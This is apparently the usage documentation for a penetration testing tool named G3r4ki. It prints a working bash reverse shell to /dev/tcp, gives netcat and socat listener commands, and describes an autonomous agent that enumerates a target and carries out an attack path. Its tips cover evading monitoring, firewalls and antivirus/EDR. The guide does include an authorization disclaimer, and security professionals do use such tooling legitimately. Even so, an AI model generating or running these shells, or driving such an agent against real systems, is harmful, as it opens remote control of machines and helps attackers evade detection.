# G3r4ki Penetration Testing Module

This guide covers the usage of G3r4ki's penetration testing capabilities, designed to assist cybersecurity professionals with common penetration testing tasks.

## Capabilities Overview

The G3r4ki Penetration Testing Module provides:

1. **Reverse Shell Generator**: Create reverse shells in multiple languages and variants
2. **System Enumeration**: Gather detailed system information for privilege escalation
3. **Privilege Escalation Techniques**: A comprehensive library of methods to elevate privileges
4. **Autonomous Penetration Testing**: Use the agent system to automate penetration tests

## Reverse Shell Generator

The reverse shell generator creates shells that connect back to your machine, establishing a command and control channel.

### Command Line Usage

```bash
# List available shell types
python demo_pentest.py shells --list

# List variants for a specific shell type
python demo_pentest.py shells --variants bash

# Generate a specific shell
python demo_pentest.py shells --type bash --variant basic --ip 192.168.1.10 --port 4444

# Generate all shell types
python demo_pentest.py shells --all --ip 192.168.1.10 --port 4444
```

### Example Output

```
Generated bash shell (basic):
--------------------------------------------------
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
--------------------------------------------------
Target: 192.168.1.10:4444
Start a listener with: nc -lvnp 4444
```

### Setting Up a Listener

Before executing a reverse shell on the target, set up a listener on your attacking machine:

```bash
# Using netcat
nc -lvnp 4444

# Using socat (for better terminal handling)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Agent-Based Penetration Testing

G3r4ki's PentestAgent provides an autonomous approach to penetration testing.

### Creating a Pentest Agent

Within the G3r4ki CLI:

```
g3r4ki> agent create pentest MyPentestAgent
g3r4ki> agent set-target MyPentestAgent 192.168.1.10
```

### Workflow Example

1. Create a penetration testing agent
2. Set the target IP or hostname
3. Run the agent to perform initial enumeration
4. Review discovered vulnerabilities
5. Execute the suggested attack path
6. Generate a comprehensive report

## Real-World Usage Scenarios

### Scenario 1: Quick External Shell Generation

When you need to quickly generate a shell for a target:

```bash
python demo_pentest.py shells --type bash --variant basic --ip 192.168.1.10 --port 4444
```

### Scenario 2: Finding the Right Shell for a Target

If you're unsure which shell will work on the target, list all variants:

```bash
python demo_pentest.py shells --variants python
```

Then generate specific shells to test:

```bash
python demo_pentest.py shells --type python --variant python3 --ip 192.168.1.10 --port 4444
```

### Scenario 3: Automated Penetration Test

For a more comprehensive test, use the agent system:

```
g3r4ki> agent create pentest AutoTarget
g3r4ki> agent set-target AutoTarget 192.168.1.10
g3r4ki> agent run AutoTarget
g3r4ki> agent report AutoTarget
```

## Best Practices

1. **Always use in authorized environments** - Never use these tools against systems without proper authorization
2. **Cleanup after testing** - Remove any artifacts, logs, or temporary files created during testing
3. **Document everything** - Keep detailed records of activities to include in your final report
4. **Use unique ports** - Avoid common ports (80, 443, 22) for reverse shells as they may be monitored
5. **Encrypt communications** - When possible, use encrypted shells to avoid detection

## Troubleshooting

If your shells aren't connecting:

1. Check if your listener is running
2. Verify there are no firewall rules blocking the connection
3. Try different shell types and variants
4. Check for any antivirus/EDR systems that might block the shell
5. Use a common port that's likely to be allowed through firewalls (80, 443, 8080)

## Advanced Usage

For more advanced penetration testing capabilities, combine the shell generator with other G3r4ki modules:

```bash
# Generate a shell and pipe it to a file
python demo_pentest.py shells --type bash --variant basic > shell.sh

# Use the LLM to analyze potential vulnerabilities
g3r4ki> llm query "Analyze potential vulnerabilities in this system: $(cat enum_results.txt)"
```